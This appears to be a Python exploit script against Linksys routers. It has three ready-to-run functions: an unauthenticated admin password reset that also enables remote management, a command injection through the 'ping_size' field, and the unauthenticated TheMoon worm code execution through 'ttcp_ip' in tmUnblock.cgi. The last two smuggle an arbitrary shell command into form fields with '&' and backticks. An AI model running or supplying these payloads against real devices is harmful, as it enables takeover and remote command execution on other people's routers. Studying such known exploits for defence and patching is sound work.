import requests

def extract_settings(settings : dict, setting : str):
  return settings[setting]

"""
DEPRECATED - has been patched

*Used to be able to* change password without need for authentication

NOTE No longer works on linksys E1000, but may work on other versions


References:

https://www.exploit-db.com/exploits/24475


(Discovered by Michael Messner)
"""
def change_password(new_password):
  target = "192.168.1.1"
  port = "80"

  timeout = 10.0
  verify = False
  allow_redirects = False

  url = f"http://{target}:{port}/apply.cgi"

  data = {
    "submit_button": "Management",
    "change_action": "",
    "action": "Apply",
    "PasswdModify": "1",
    "http_enable": "1",
    "https_enable": "0",
    "ctm404_enable": "",
    "remote_mgt_https": "0",
    "wait_time": "4",
    "need_reboot": "0",
    "http_passwd": new_password,
    "http_passwdConfirm": new_password,
    "_http_enable": "1",
    "web_wl_filter": "0",
    "remote_management": "1",
    "_remote_mgt_https": "1",
    "remote_upgrade": "0",
    "remote_ip_any": "1",
    "http_wanport": "8080",
    "nf_alg_sip": "0",
    "upnp_enable": "1",
    "upnp_config": "1",
    "upnp_internet_dis": "0"
  }

  response = requests.post(url, data = data, timeout = timeout, verify = verify, allow_redirects = allow_redirects)

  print("Server responded with status code " + str(response.status_code))


"""
Exploits the fact that the 'ping_size' field is not properly validated,
allowing us to inject code and remotely execute shell commands.

NOTE In order to utilize this exploit, you must already know the
login to the router (previous methods of gaining login information have 
been patched). For this reason, this exploit isn't too useful in 
the real world.


References:

https://www.exploit-db.com/exploits/24475


(Discovered by Michael Messner)

"""
def command_line_injection(settings : dict, cmd : str):
  target = extract_settings(settings, "target")
  port = extract_settings(settings, "port")
  username = extract_settings(settings, "username")
  password = extract_settings(settings, "password")
  timeout = extract_settings(settings, "timeout")
  verify = extract_settings(settings, "verify")
  allow_redirects = extract_settings(settings, "allow_redirects")

  url = f"http://{target}:{port}/apply.cgi"
  
  data = {
    "submit_button": "Diagnostics",
    "change_action": "gozila_cgi",
    "submit_type": "start_ping",
    "action": "",
    "commit": "0",
    "ping_ip": "1.1.1.1",
    "ping_size": "&" + cmd, # Inject cmd through ping size since ping size not validated  
    "ping_times": "5",
    "traceroute_ip": ""
  }

  response = requests.post(url, data = data, auth = (username, password), timeout = timeout, verify = verify, allow_redirects = allow_redirects)

  print("Server responded with status code " + str(response.status_code))

"""
Exploits the TTCP_IP field, allowing us to implement unauthenticated remote code 
execution. This was actively used by the 'Moon' Worm in 2014. Unlike the 
previous exploit, this one does not require us to have any login authentication.


References:

https://www.exploit-db.com/exploits/31683/
https://packetstormsecurity.com/files/125252
https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630


(Discovered by Johannes Ullrich)

"""
def moon_exploit(settings : dict, cmd : str):
  target = extract_settings(settings, "target")
  port = extract_settings(settings, "port")
  timeout = extract_settings(settings, "timeout")
  verify = extract_settings(settings, "verify")
  allow_redirects = extract_settings(settings, "allow_redirects")

  url =  f"http://{target}:{port}/tmUnblock.cgi"

  data = {
    "submit_button": "",
    "change_action": "",
    "action": "",
    "commit": "0",
    "ttcp_num": "2",
    "ttcp_size": "2",
    "ttcp_ip": f"-h `{cmd}`",
    "StartEPI": "1",
  }
  
  response = requests.post(url, data= data, timeout = timeout, verify = verify, allow_redirects = allow_redirects)

  print("Server responded with status code " + str(response.status_code))